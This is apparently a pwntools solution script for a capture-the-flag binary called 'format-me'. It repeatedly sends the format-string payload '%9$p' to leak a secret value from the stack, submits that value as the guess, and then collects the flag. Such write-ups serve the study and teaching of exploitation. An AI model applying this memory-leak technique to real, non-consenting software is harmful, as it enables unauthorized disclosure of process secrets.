#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./format-me")

r = process([exe.path])
#r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line

for _ in range(10):
    r.recvuntil(b"Recipient? ")
    r.sendline(b"%9$p")  # Leak secret code
    
    leak = r.recvline().strip()
    line = leak.decode()  # Convert bytes to string
    val_str = line.split("0x")[1]  # Get hex part after "0x"
    val = int("0x" + val_str, 16)

    #val = int(leak, 16)  # Convert hex leak to integer
    r.recvuntil(b"Guess? ")
    r.sendline(str(val).encode())  # Send guess
    r.recvuntil(b"Correct")


r.recvuntil(b"Here's your flag: ")
r.interactive()